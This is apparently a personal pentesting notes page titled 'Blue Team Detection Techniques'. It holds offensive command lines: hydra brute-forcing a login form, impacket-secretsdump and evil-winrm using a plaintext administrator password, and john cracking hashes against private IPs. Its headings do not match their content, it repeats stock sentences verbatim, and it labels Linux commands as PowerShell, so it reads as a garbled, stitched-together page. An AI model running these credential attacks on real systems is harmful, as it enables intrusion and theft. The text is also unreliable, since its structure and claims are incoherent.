---
TitleSEO: "Blue Team Detection Techniques | ZureFX"
TitlePost: "Blue Team Detection Techniques"
Author: "ZureFX"
Description: "Personal notes on Blue Team Detection Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "windows, enumeration, malware"
URL: "https://zurefx.github.io/notes/note-blue-team-detection-techniques-244.html"
URL_IMAGES: ""
Date: "2024-09-11"
Tags: "Windows, Enumeration, Malware"
Section: "notes"
Lang: "en"
main_img: "note-blue-team-detection-techniques-244"
Permalink: "/notes/note-blue-team-detection-techniques-244.html"
BtnLabel: "Read Notes"
Pick: 0
---
## IDOR

### FTP

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials. Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
evil-winrm -i 10.70.11.27 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.17.202.194/FUZZ
feroxbuster -h
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.183.192 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.96.237.48
```

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Open Redirect

### Python

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.51.165.177/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.121.55.74 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p8080,993,3389 10.74.106.9 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

- `SQL Injection`
- `Resource-Based Constrained Delegation`
- `XSS`
- `Constrained Delegation`
- `psexec`

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.46.2.239 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Pass the Ticket

### gobuster

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.93.120.131 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.123.145.79 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file.

```bash
nmap -sCV -p587,993,8080 10.30.78.78 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.31.156.166/FUZZ
```

```bash
gobuster dir -u http://10.47.247.145/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Writable PATH

### Path Traversal

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.111.150.90 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service.
